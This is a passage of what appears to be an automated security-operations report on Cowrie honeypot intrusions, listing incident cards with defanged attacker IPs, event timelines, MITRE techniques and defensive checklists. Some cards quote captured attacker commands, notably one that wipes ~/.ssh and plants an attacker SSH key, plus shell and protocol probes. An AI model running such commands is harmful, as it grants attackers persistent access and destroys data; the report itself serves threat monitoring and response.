- [ ] Block `111.70.32[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ac720ede512

| Field | Detail |
|---|---|
| **Source IP** | `65.20.168[.]147` |
| **First Seen** | 2026-08-01 05:59 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:59:10` | `cowrie.session.connect` |
| `2026-08-01 05:59:10` | `cowrie.client.version` |
| `2026-08-01 05:59:10` | `cowrie.client.kex` |
| `2026-08-01 05:59:12` | `cowrie.login.success` |
| `2026-08-01 05:59:12` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.168[.]147` to AbuseIPDB if not already reported
- [ ] Block `65.20.168[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c7e803ab4a

| Field | Detail |
|---|---|
| **Source IP** | `220.124.233[.]214` |
| **First Seen** | 2026-08-01 05:59 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:59:11` | `cowrie.session.connect` |
| `2026-08-01 05:59:12` | `cowrie.client.version` |
| `2026-08-01 05:59:12` | `cowrie.client.kex` |
| `2026-08-01 05:59:14` | `cowrie.login.success` |
| `2026-08-01 05:59:14` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.124.233[.]214` to AbuseIPDB if not already reported
- [ ] Block `220.124.233[.]214` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238647945ea2

| Field | Detail |
|---|---|
| **Source IP** | `78.186.54[.]65` |
| **First Seen** | 2026-08-01 05:59 |
| **Last Seen** | 2026-08-01 05:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 05:59:47` | `cowrie.session.connect` |
| `2026-08-01 05:59:47` | `cowrie.client.version` |
| `2026-08-01 05:59:47` | `cowrie.client.kex` |
| `2026-08-01 05:59:48` | `cowrie.login.success` |
| `2026-08-01 05:59:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 05:59:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.186.54[.]65` to AbuseIPDB if not already reported
- [ ] Block `78.186.54[.]65` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969031115411

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-08-01 06:00 |
| **Last Seen** | 2026-08-01 06:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:00:54` | `cowrie.session.connect` |
| `2026-08-01 06:00:55` | `cowrie.client.version` |
| `2026-08-01 06:00:55` | `cowrie.client.kex` |
| `2026-08-01 06:00:56` | `cowrie.login.success` |
| `2026-08-01 06:00:57` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e50878c04862

| Field | Detail |
|---|---|
| **Source IP** | `190.188.60[.]235` |
| **First Seen** | 2026-08-01 06:01 |
| **Last Seen** | 2026-08-01 06:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, system, shell, sh, echo C2PROBE_OK_$?` |
| **TTPs (MITRE)** | T1059.004 · T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:01:22` | `cowrie.session.connect` |
| `2026-08-01 06:01:22` | `cowrie.telnet.option` |
| `2026-08-01 06:01:22` | `cowrie.login.success` |
| `2026-08-01 06:01:23` | `cowrie.session.params` |
| `2026-08-01 06:01:23` | `cowrie.telnet.option` |
| `2026-08-01 06:01:23` | `cowrie.telnet.option` |
| `2026-08-01 06:01:23` | `cowrie.command.input` |
| `2026-08-01 06:01:23` | `cowrie.command.failed` |
| `2026-08-01 06:01:23` | `cowrie.command.input` |
| `2026-08-01 06:01:23` | `cowrie.command.failed` |
| `2026-08-01 06:01:23` | `cowrie.command.input` |
| `2026-08-01 06:01:23` | `cowrie.command.failed` |
| `2026-08-01 06:01:24` | `cowrie.command.input` |
| `2026-08-01 06:01:24` | `cowrie.command.input` |
| `2026-08-01 06:01:27` | `cowrie.log.closed` |
| `2026-08-01 06:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.188.60[.]235` to AbuseIPDB if not already reported
- [ ] Block `190.188.60[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a28dccbbb10a

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]219` |
| **First Seen** | 2026-08-01 06:04 |
| **Last Seen** | 2026-08-01 06:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:04:55` | `cowrie.session.connect` |
| `2026-08-01 06:04:56` | `cowrie.client.version` |
| `2026-08-01 06:04:56` | `cowrie.client.kex` |
| `2026-08-01 06:04:58` | `cowrie.login.success` |
| `2026-08-01 06:04:59` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:05:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]219` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a22c22f41d1

| Field | Detail |
|---|---|
| **Source IP** | `125.72.150[.]250` |
| **First Seen** | 2026-08-01 06:05 |
| **Last Seen** | 2026-08-01 06:05 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:05:05` | `cowrie.session.connect` |
| `2026-08-01 06:05:07` | `cowrie.client.version` |
| `2026-08-01 06:05:07` | `cowrie.client.kex` |
| `2026-08-01 06:05:09` | `cowrie.login.success` |
| `2026-08-01 06:05:11` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.72.150[.]250` to AbuseIPDB if not already reported
- [ ] Block `125.72.150[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-229cac753f22

| Field | Detail |
|---|---|
| **Source IP** | `204.76.203[.]81` |
| **First Seen** | 2026-08-01 06:05 |
| **Last Seen** | 2026-08-01 06:08 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:05:49` | `cowrie.session.connect` |
| `2026-08-01 06:05:49` | `cowrie.login.success` |
| `2026-08-01 06:05:50` | `cowrie.session.params` |
| `2026-08-01 06:08:50` | `cowrie.log.closed` |
| `2026-08-01 06:08:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `204.76.203[.]81` to AbuseIPDB if not already reported
- [ ] Block `204.76.203[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19cf2be1609

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-08-01 06:07 |
| **Last Seen** | 2026-08-01 06:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:07:03` | `cowrie.session.connect` |
| `2026-08-01 06:07:04` | `cowrie.client.version` |
| `2026-08-01 06:07:04` | `cowrie.client.kex` |
| `2026-08-01 06:07:07` | `cowrie.login.success` |
| `2026-08-01 06:07:09` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcf134a6968

| Field | Detail |
|---|---|
| **Source IP** | `220.179.87[.]204` |
| **First Seen** | 2026-08-01 06:07 |
| **Last Seen** | 2026-08-01 06:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:07:18` | `cowrie.session.connect` |
| `2026-08-01 06:07:19` | `cowrie.client.version` |
| `2026-08-01 06:07:19` | `cowrie.client.kex` |
| `2026-08-01 06:07:22` | `cowrie.login.success` |
| `2026-08-01 06:07:23` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.179.87[.]204` to AbuseIPDB if not already reported
- [ ] Block `220.179.87[.]204` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ca557fd5193

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]161` |
| **First Seen** | 2026-08-01 06:09 |
| **Last Seen** | 2026-08-01 06:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:09:55` | `cowrie.session.connect` |
| `2026-08-01 06:09:55` | `cowrie.client.version` |
| `2026-08-01 06:09:55` | `cowrie.client.kex` |
| `2026-08-01 06:09:55` | `cowrie.login.success` |
| `2026-08-01 06:09:56` | `cowrie.session.params` |
| `2026-08-01 06:09:56` | `cowrie.command.input` |
| `2026-08-01 06:09:56` | `cowrie.command.failed` |
| `2026-08-01 06:09:56` | `cowrie.log.closed` |
| `2026-08-01 06:09:56` | `cowrie.session.params` |
| `2026-08-01 06:09:56` | `cowrie.command.input` |
| `2026-08-01 06:09:57` | `cowrie.session.file_download` |
| `2026-08-01 06:09:57` | `cowrie.log.closed` |
| `2026-08-01 06:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]161` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18d78393430a

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]161` |
| **First Seen** | 2026-08-01 06:09 |
| **Last Seen** | 2026-08-01 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:09:57` | `cowrie.session.connect` |
| `2026-08-01 06:09:57` | `cowrie.client.version` |
| `2026-08-01 06:09:57` | `cowrie.client.kex` |
| `2026-08-01 06:09:57` | `cowrie.login.success` |
| `2026-08-01 06:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]161` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b8375d9b47c

| Field | Detail |
|---|---|
| **Source IP** | `144.225.187[.]161` |
| **First Seen** | 2026-08-01 06:09 |
| **Last Seen** | 2026-08-01 06:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:09:57` | `cowrie.session.connect` |
| `2026-08-01 06:09:57` | `cowrie.client.version` |
| `2026-08-01 06:09:57` | `cowrie.client.kex` |
| `2026-08-01 06:09:57` | `cowrie.login.success` |
| `2026-08-01 06:09:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.225.187[.]161` to AbuseIPDB if not already reported
- [ ] Block `144.225.187[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3d3ce9ab23

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-01 06:12 |
| **Last Seen** | 2026-08-01 06:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:12:31` | `cowrie.session.connect` |
| `2026-08-01 06:12:32` | `cowrie.client.version` |
| `2026-08-01 06:12:32` | `cowrie.client.kex` |
| `2026-08-01 06:12:33` | `cowrie.login.success` |
| `2026-08-01 06:12:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:12:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4b83b916b09

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:13 |
| **Last Seen** | 2026-08-01 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:13:44` | `cowrie.session.connect` |
| `2026-08-01 06:13:44` | `cowrie.login.success` |
| `2026-08-01 06:13:44` | `cowrie.session.params` |
| `2026-08-01 06:13:46` | `cowrie.log.closed` |
| `2026-08-01 06:13:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dce0ccceded

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:13 |
| **Last Seen** | 2026-08-01 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:13:46` | `cowrie.session.connect` |
| `2026-08-01 06:13:46` | `cowrie.login.success` |
| `2026-08-01 06:13:47` | `cowrie.session.params` |
| `2026-08-01 06:13:48` | `cowrie.log.closed` |
| `2026-08-01 06:13:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85b75c9bf7d5

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:13 |
| **Last Seen** | 2026-08-01 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:13:48` | `cowrie.session.connect` |
| `2026-08-01 06:13:48` | `cowrie.login.success` |
| `2026-08-01 06:13:49` | `cowrie.session.params` |
| `2026-08-01 06:13:51` | `cowrie.log.closed` |
| `2026-08-01 06:13:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d2cb3b57d5

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:13 |
| **Last Seen** | 2026-08-01 06:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:13:51` | `cowrie.session.connect` |
| `2026-08-01 06:13:51` | `cowrie.login.success` |
| `2026-08-01 06:13:51` | `cowrie.session.params` |
| `2026-08-01 06:13:53` | `cowrie.log.closed` |
| `2026-08-01 06:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f0aee05401c

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:06` | `cowrie.session.connect` |
| `2026-08-01 06:14:06` | `cowrie.login.success` |
| `2026-08-01 06:14:07` | `cowrie.session.params` |
| `2026-08-01 06:14:08` | `cowrie.log.closed` |
| `2026-08-01 06:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d31572dc7cf

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:10` | `cowrie.session.connect` |
| `2026-08-01 06:14:10` | `cowrie.login.success` |
| `2026-08-01 06:14:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1358a871c923

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:14` | `cowrie.session.connect` |
| `2026-08-01 06:14:14` | `cowrie.login.success` |
| `2026-08-01 06:14:14` | `cowrie.session.params` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:14` | `cowrie.command.failed` |
| `2026-08-01 06:14:14` | `cowrie.command.input` |
| `2026-08-01 06:14:16` | `cowrie.log.closed` |
| `2026-08-01 06:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.110.200[.]219` to AbuseIPDB if not already reported
- [ ] Block `143.110.200[.]219` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0929cd6c2f

| Field | Detail |
|---|---|
| **Source IP** | `219.129.96[.]2` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:29` | `cowrie.session.connect` |
| `2026-08-01 06:14:30` | `cowrie.client.version` |
| `2026-08-01 06:14:30` | `cowrie.client.kex` |
| `2026-08-01 06:14:33` | `cowrie.login.success` |
| `2026-08-01 06:14:34` | `cowrie.direct-tcpip.request` |
| `2026-08-01 06:14:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.96[.]2` to AbuseIPDB if not already reported
- [ ] Block `219.129.96[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edcaf401de58

| Field | Detail |
|---|---|
| **Source IP** | `143.110.200[.]219` |
| **First Seen** | 2026-08-01 06:14 |
| **Last Seen** | 2026-08-01 06:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `   <action>MSMQ:poc</action>,    <to>hxxp://192.168.10[.]100/msmq/private$/queuejumper</to>,    <id>uuid:1@00000000-0000-0000-0000-000000000000</id>,  </path>,  <properties se:mustUnderstand="1">` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 06:14:29` | `cowrie.session.connect` |
| `2026-08-01 06:14:29` | `cowrie.login.success` |
| `2026-08-01 06:14:29` | `cowrie.login.success` |
| `2026-08-01 06:14:30` | `cowrie.session.params` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.failed` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
| `2026-08-01 06:14:30` | `cowrie.command.input` |
